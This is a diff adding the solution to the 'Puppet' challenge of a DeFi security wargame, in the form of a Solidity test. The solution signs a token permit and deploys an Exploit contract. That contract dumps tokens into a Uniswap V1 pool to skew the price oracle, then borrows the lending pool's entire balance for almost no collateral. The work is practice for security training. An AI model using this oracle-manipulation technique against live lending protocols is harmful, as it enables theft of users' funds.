@@ -92,7 +92,38 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        // Sign
+        address exploit = vm.computeCreateAddress(player, vm.getNonce(player));
+        uint256 deadline = block.timestamp;
+        (uint8 v, bytes32 r, bytes32 s) =
+            vm.sign(playerPrivateKey, hash(player, exploit, PLAYER_INITIAL_TOKEN_BALANCE, deadline));
+
+        // Exploit
+        new Exploit{value: address(player).balance}(
+            lendingPool,
+            Permit(player, exploit, PLAYER_INITIAL_TOKEN_BALANCE, deadline, v, r, s),
+            POOL_INITIAL_TOKEN_BALANCE,
+            recovery
+        );
+    }
+
+    function hash(address owner, address spender, uint256 value, uint256 deadline) private view returns (bytes32) {
+        return keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                token.DOMAIN_SEPARATOR(),
+                keccak256(
+                    abi.encode(
+                        keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
+                        owner,
+                        spender,
+                        value,
+                        0,
+                        deadline
+                    )
+                )
+            )
+        );
     }
 
     // Utility function to calculate Uniswap prices
@@ -114,5 +145,37 @@ contract PuppetChallenge is Test {
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+struct Permit {
+    address owner;
+    address spender;
+    uint256 value;
+    uint256 deadline;
+    uint8 v;
+    bytes32 r;
+    bytes32 s;
+}
+
+contract Exploit {
+    constructor(PuppetPool lendingPool, Permit memory permit, uint256 recoverAmount, address recovery) payable {
+        DamnValuableToken token = lendingPool.token();
+        IUniswapV1Exchange uniswapV1Exchange = IUniswapV1Exchange(lendingPool.uniswapPair());
+
+        // Get DVT
+        token.permit(permit.owner, permit.spender, permit.value, permit.deadline, permit.v, permit.r, permit.s);
+        token.transferFrom(permit.owner, address(this), permit.value);
+
+        // Flood pool with DVT
+        token.approve(address(uniswapV1Exchange), permit.value);
+        uniswapV1Exchange.tokenToEthSwapInput(permit.value, 9.9 ether, block.timestamp);
+
+        // Borrow with little collateral
+        lendingPool.borrow{value: lendingPool.calculateDepositRequired(recoverAmount)}(recoverAmount, recovery);
+
+        // Send back unused ether
+        (bool sent,) = msg.sender.call{value: address(this).balance}("");
+        require(sent, "failed to return ether");
     }
 }
